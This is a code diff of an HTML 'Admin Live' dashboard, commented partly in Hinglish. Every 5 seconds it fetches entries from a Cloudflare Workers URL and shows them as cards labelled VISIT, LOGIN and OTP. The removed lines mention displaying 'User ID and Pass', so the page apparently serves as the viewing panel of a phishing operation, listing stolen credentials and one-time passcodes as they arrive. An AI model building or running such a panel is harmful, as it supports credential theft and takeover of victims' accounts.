@@ -3,118 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Admin Panel</title>
+    <title>Admin Live</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
-        body { background-color: #f4f7f6; padding-bottom: 50px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        body { background-color: #f4f4f9; padding-bottom: 30px; }
 
         /* Header */
         .header {
             background: #315195;
             color: white;
-            padding: 15px 20px;
+            padding: 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             position: sticky;
             top: 0;
             z-index: 1000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-        .header h1 { font-size: 18px; font-weight: 700; }
-        .count-badge { background: #ff9800; padding: 4px 12px; border-radius: 20px; font-weight: 800; font-size: 14px; }
+        .header h1 { font-size: 18px; }
+        .v-count { background: #fff; color: #315195; padding: 2px 10px; border-radius: 15px; font-weight: 900; }
 
-        .container { padding: 12px; display: flex; flex-direction: column; gap: 12px; }
+        .container { padding: 10px; display: flex; flex-direction: column; gap: 10px; }
 
-        /* Card Styling */
+        /* Vertical Cards */
         .card {
             background: #fff;
-            border-radius: 10px;
+            border-radius: 8px;
             padding: 15px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
             border-left: 6px solid #315195;
-            animation: slideIn 0.3s ease;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        .card-top { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; padding-bottom: 5px; }
         .tag { font-size: 11px; font-weight: 800; color: #315195; text-transform: uppercase; }
         .time { font-size: 10px; color: #999; }
 
-        /* Data Format: User ID & Pass */
-        .data-content { 
+        /* Alag-Alag Line ka Logic */
+        .detail-text { 
             font-size: 16px; 
             color: #222; 
-            line-height: 1.8; 
-            white-space: pre-wrap; 
+            font-weight: 700; 
+            line-height: 1.8; /* Line ke beech gap */
+            white-space: pre-wrap; /* \n ko asli line break mein badal dega */
+            word-break: break-all;
         }
-        .label { color: #555; font-weight: 500; font-size: 14px; }
-        .value { font-weight: 800; color: #000; }
 
-        /* Color classes */
+        /* Color Coding */
         .card-login { border-left-color: #28a745; }
         .card-otp { border-left-color: #ff9800; }
-        .card-visit { border-left-color: #315195; }
-
-        .status-dot { height: 8px; width: 8px; background: #28a745; border-radius: 50%; display: inline-block; animation: blink 1.5s infinite; margin-right: 5px; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        .footer { text-align: center; font-size: 11px; color: #777; margin-top: 20px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>ADMIN LOGS</h1>
-        <div class="count-badge" id="vCount">Visits: 0</div>
+        <h1>LIVE DATA</h1>
+        <div class="v-count" id="vTotal">0</div>
     </div>
 
-    <div class="container" id="logBox">
+    <div class="container" id="displayArea">
         </div>
-
-    <div class="footer">
-        <span class="status-dot"></span> System Live | Auto-Refresh 5s
-    </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        async function updateLogs() {
+        async function loadData() {
             try {
                 const res = await fetch(workerURL);
-                const logs = await res.json();
-                const box = document.getElementById('logBox');
-                const vDisplay = document.getElementById('vCount');
+                const data = await res.json();
+                
+                const area = document.getElementById('displayArea');
+                const vCount = document.getElementById('vTotal');
 
-                if (!logs || logs.length === 0) {
-                    box.innerHTML = "<p style='text-align:center; padding:50px; color:#bbb;'>Waiting for new data...</p>";
+                if (!data || data.length === 0) {
+                    area.innerHTML = "<p style='text-align:center;margin-top:50px;color:#999;'>Waiting...</p>";
                     return;
                 }
 
-                // Count visits
-                const visits = logs.filter(l => String(l.type).toUpperCase().includes("VISIT")).length;
-                vDisplay.innerText = `Visits: ${visits}`;
+                // Total Visit Count
+                vCount.innerText = data.filter(l => String(l.type).includes("VISIT")).length;
 
                 // Render Logs
-                box.innerHTML = logs.map(log => {
-                    let cardClass = "card-visit";
-                    const type = String(log.type).toUpperCase();
-                    if(type.includes("LOGIN")) cardClass = "card-login";
-                    if(type.includes("OTP")) cardClass = "card-otp";
-
-                    // Formatting details for User ID and Pass
-                    let formattedDetail = log.detail;
-                    if(type.includes("LOGIN")) {
-                        // Agar worker se <br> aa raha hai toh usse clean karke dikhao
-                        formattedDetail = log.detail.replace(/<br>/g, '\n');
-                    }
+                area.innerHTML = data.map(log => {
+                    let cType = "";
+                    if(log.type.includes("LOGIN")) cType = "card-login";
+                    if(log.type.includes("OTP")) cType = "card-otp";
 
                     return `
-                        <div class="card ${cardClass}">
-                            <div class="card-header">
+                        <div class="card ${cType}">
+                            <div class="card-top">
                                 <span class="tag">${log.type}</span>
                                 <span class="time">${log.time}</span>
                             </div>
-                            <div class="data-content">${formattedDetail}</div>
+                            <div class="detail-text">${log.detail}</div>
                         </div>
                     `;
                 }).join('');
@@ -122,8 +103,8 @@
             } catch (e) { console.log("Updating..."); }
         }
 
-        setInterval(updateLogs, 5000);
-        window.onload = updateLogs;
+        setInterval(loadData, 5000);
+        window.onload = loadData;
     </script>
 </body>
 </html>
